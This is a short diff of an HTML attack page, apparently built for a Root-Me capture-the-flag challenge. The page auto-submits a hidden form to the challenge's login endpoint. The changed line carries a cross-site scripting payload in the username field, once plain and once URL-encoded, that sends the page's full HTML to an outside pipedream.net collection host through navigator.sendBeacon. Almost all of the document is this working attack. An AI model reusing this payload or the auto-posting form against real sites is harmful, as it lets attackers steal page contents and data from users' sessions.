@@ -4,7 +4,7 @@
     <!-- Auto-POST to the vulnerable endpoint -->
     <form id="f" action="http://challenge01.root-me.org:58003/login" method="POST">
       <input type="hidden" name="username"
-        value="<script>navigator.sendBeacon('https://eorwyjwmqeeen92.m.pipedream.net/?c=', new Blob([document.documentElement.outerHTML],{type:'text/plain'}));</script>">
+        value="%3Cscript%3Enavigator.sendBeacon(%27https%3A%2F%2Feorwyjwmqeeen92.m.pipedream.net%2F%3Fc%3D%27%2C%20new%20Blob(%5Bdocument.documentElement.outerHTML%5D%2C%7Btype%3A%27text%2Fplain%27%7D))%3B%3C%2Fscript%3E">
       <input type="hidden" name="secret" value="a">
     </form>
     <script>
